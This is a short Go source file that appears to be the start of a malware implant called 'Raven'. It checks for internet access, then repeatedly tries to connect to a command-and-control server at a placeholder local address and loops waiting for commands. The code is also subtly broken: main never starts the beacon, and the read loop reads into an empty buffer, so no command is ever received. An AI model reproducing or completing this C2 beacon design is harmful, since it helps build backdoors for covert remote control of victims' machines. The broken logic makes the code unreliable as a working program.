package main

import (
	"fmt"
	"net"
	"net/http"
	"time"
)

const (
	HOST = "127.0.0.1"
	PORT = 12345
)

func main() {
	fmt.Println("[*] Initializing Raven ...")
}

func has_internet_access() bool {
	_, err := http.Get("https://google.com")
	return err == nil
}

func reach_command_and_control() {
	if has_internet_access() {
		addr := fmt.Sprintf("%s:%d", HOST, PORT)
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			time.Sleep(time.Second * 30)
			reach_command_and_control()
		} else {
			// communication with C2
			engage_via(conn)
		}
	} else {
		time.Sleep(time.Second * 30)
		reach_command_and_control()
	}
}

func engage_via(conn net.Conn) {
	for {
		var cmd []byte
		conn.Read(cmd)
	}
}